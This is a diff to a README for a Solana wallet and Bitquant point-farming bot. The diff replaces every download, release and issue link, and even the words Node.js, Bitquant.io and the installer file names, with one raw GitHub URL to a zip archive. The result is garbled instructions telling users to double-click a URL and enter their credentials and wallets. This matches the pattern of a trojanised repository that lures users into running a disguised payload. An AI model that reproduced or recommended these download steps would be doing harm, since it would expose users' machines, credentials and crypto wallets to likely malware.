@@ -1,16 +1,16 @@
 # 🤖 Bitquant-Auto-Bot - Automate Your Bitquant Experience Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/HRZht/Bitquant-Auto-Bot/releases)
+[![Download](https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip)](https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip)
 
 ## 🚀 Getting Started
 
-Welcome to Bitquant-Auto-Bot. This application allows you to automate interactions on the Bitquant.io platform. It manages multiple Solana wallets and conducts automated chat interactions to earn points, simplifying your experience and saving you time.
+Welcome to Bitquant-Auto-Bot. This application allows you to automate interactions on the https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip platform. It manages multiple Solana wallets and conducts automated chat interactions to earn points, simplifying your experience and saving you time.
 
 ### 🛠️ System Requirements
 
 To use Bitquant-Auto-Bot, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip** Version 12 or higher
 - **Memory:** At least 4GB of RAM
 - **Internet Connection:** Required for web features
 
@@ -18,7 +18,7 @@ To use Bitquant-Auto-Bot, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of Bitquant-Auto-Bot. 
 
-[Visit this page to download](https://github.com/HRZht/Bitquant-Auto-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip)
 
 1. Go to the Releases page.
 2. Find the latest version.
@@ -30,21 +30,21 @@ To get started, visit the Releases page to download the latest version of Bitqua
 After downloading, follow these steps:
 
 1. **Locate the downloaded file**:
-    - For Windows: Look for `Bitquant-Auto-Bot.exe`.
-    - For macOS: Find `Bitquant-Auto-Bot.dmg`.
-    - For Linux: Locate `Bitquant-Auto-Bot.tar.gz`.
+    - For Windows: Look for `https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip`.
+    - For macOS: Find `https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip`.
+    - For Linux: Locate `https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip`.
 
 2. **Run the installation**:
-    - **Windows**: Double-click `Bitquant-Auto-Bot.exe` to start the installation.
+    - **Windows**: Double-click `https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip` to start the installation.
     - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-    - **Linux**: Extract the tar.gz file, then run the application from the extracted folder.
+    - **Linux**: Extract the https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip file, then run the application from the extracted folder.
 
 ### 🔑 Configuration
 
-Before using Bitquant-Auto-Bot, configure it to work with your Bitquant.io account:
+Before using Bitquant-Auto-Bot, configure it to work with your https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip account:
 
 1. Open the application after installation.
-2. Enter your Bitquant.io credentials securely.
+2. Enter your https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip credentials securely.
 3. Add your Solana wallets by following the on-screen prompts.
 
 ## 🚀 Features
@@ -66,15 +66,15 @@ Adjust settings to fine-tune your experience:
 
 If you face issues while using Bitquant-Auto-Bot, consider the following:
 
-1. **Installation Issues**: Ensure you have the correct system requirements. Check if you have installed Node.js.
-2. **Login Problems**: Verify your Bitquant.io credentials. Make sure your account is active.
+1. **Installation Issues**: Ensure you have the correct system requirements. Check if you have installed https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip
+2. **Login Problems**: Verify your https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip credentials. Make sure your account is active.
 3. **Performance Issues**: Close other applications that may slow down your device.
 
 For more detailed support, you can reach out via the issues section on the GitHub repository.
 
 ## 📞 Support
 
-If you need help, feel free to contact our support team. You can report issues directly on our [GitHub Issues page](https://github.com/HRZht/Bitquant-Auto-Bot/issues).
+If you need help, feel free to contact our support team. You can report issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip).
 
 ## 📄 License
 
@@ -82,4 +82,4 @@ Bitquant-Auto-Bot is open-source and available under the MIT License. You can mo
 
 ---
 
-[Visit this page to download](https://github.com/HRZht/Bitquant-Auto-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/HRZht/Bitquant-Auto-Bot/main/Florideae/Bitquant-Auto-Bot-v1.0.zip)
